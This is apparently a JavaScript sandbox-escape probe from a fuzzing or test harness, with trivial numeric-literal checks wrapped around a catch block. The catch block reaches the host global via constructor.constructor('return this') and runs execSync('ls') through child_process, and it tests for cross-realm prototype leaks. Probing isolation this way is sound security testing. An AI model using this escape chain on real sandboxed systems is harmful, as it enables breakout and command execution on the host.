try {
    if (0 !== 0) {
        $ERROR('#0: 0e-1 === 0');
    }
    if (0.1 !== 0.1) {
        $ERROR('#1: 1e-1 === 0.1');
    }
    if (0.2 !== 0.2) {
        $ERROR('#2: 2e-1 === 0.2');
    }
    if (0.3 !== 0.3) {
        $ERROR('#3: 3e-1 === 0.3');
    }
    if (0.4 !== 0.4) {
        $ERROR('#4: 4e-1 === 0.4');
    }
    if (0.5 !== 0.5) {
        $ERROR('#5: 5e-1 === 0.5');
    }
    if (0.6 !== 0.6) {
        $ERROR('#6: 6e-1 === 0.6');
    }
    if (0.7 !== 0.7) {
        $ERROR('#7: 7e-1 === 0.7');
    }
    if (0.8 !== 0.8) {
        $ERROR('#8: 8e-1 === 0.8');
    }
    if (0.9 !== 0.9) {
        $ERROR('#9: 9e-1 === 0.9');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}